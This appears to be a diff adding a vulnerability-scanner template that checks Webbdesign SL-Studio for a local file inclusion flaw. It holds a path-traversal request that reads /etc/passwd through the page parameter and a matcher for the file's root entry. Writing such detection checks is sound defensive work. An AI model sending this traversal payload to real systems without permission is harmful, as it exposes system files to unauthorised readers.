@@ -1,0 +1,28 @@
+id: "sl-studio-lfi"
+name: "Webbdesign SL-Studio - Local File Inclusion"
+severity: "high"
+description: "Webbdesign SL-Studio is vulnerable to local file inclusion."
+tech:
+  - "php"
+tags:
+  - "slstudio"
+  - "lfi"
+  - "vuln"
+cwe: "CWE-22"
+reference: "https://cxsecurity.com/issue/WLB-2018110187"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/index.php?page=../../../../../../../../../../etc/passwd"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "regex"
+    part: "body"
+    regex:
+      - "root:[x*]:0:0"
+  - type: "status"
+    status:
+      - 200
